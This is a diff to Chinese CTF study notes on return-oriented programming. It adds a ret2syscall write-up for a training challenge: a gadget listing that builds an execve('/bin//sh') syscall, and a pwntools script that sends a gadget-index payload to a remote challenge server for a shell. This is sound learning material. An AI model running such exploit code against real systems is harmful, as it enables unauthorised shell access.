@@ -260,11 +260,87 @@ amd64
 
 ROP的一种，并不成为大类
 
-作为布置场景的函数，就是将值填入很多寄存器中
+作为布置场景的做法，就是将值填入很多寄存器中
 
 控制rdx、rsi、edi的低32位
 
 
+
+使用`objdump`来查看有没有`_libc_csu_init_ `这种特殊的`gadget`
+
+```
+objdump -d ./pwn
+```
+
+
+
+## ret2syscall
+
+
+
+### 某个题目
+
+train.cs.nctu.edu.tw：rop
+
+nc连接上会输出gadgets，去选择构造payload，这道题考验基本功
+
+![1566026309029.png](../_media/1574668172344-2d5dce6a-3e6a-437a-bcc7-5a06950ee918.webp)
+
+
+
+![image.png](../_media/1574668407609-8e44a3b0-4464-41c1-aad9-e9163a76d1c1.webp)
+
+
+
+汇编：
+
+```asm
+push esp
+push ebp
+push esp
+push ebp
+pop ebx
+pop ebp
+xor eax,eax
+push 0x68732f6e
+push 0x69622f2f
+push esp
+push ebp
+mov edx,eax
+pop ebx
+mov edx,eax
+pop ebx
+push 1
+push 2
+pop ecx
+pop eax
+push 1
+push 2
+sub ecx,eax
+pop ebp
+sub ecx,eax
+pop ebp
+add eax,0x2
+add eax,0x2
+add eax,0x2
+add eax,0x2
+add eax,0x2
+int 0x80
+pop ebp
+pop edi
+pop esi
+pop ebx
+```
+
+
+
+```python
+from pwn import *
+sh = remote('bamboofox.cs.nctu.edu.tw',10001)
+payload = "9,9,1,10,9,3,3,12,4,12,2,2,8,8,8,8,8,0"
+sh.sendline(payload)
+sh.interactive()
+```
 
 
 
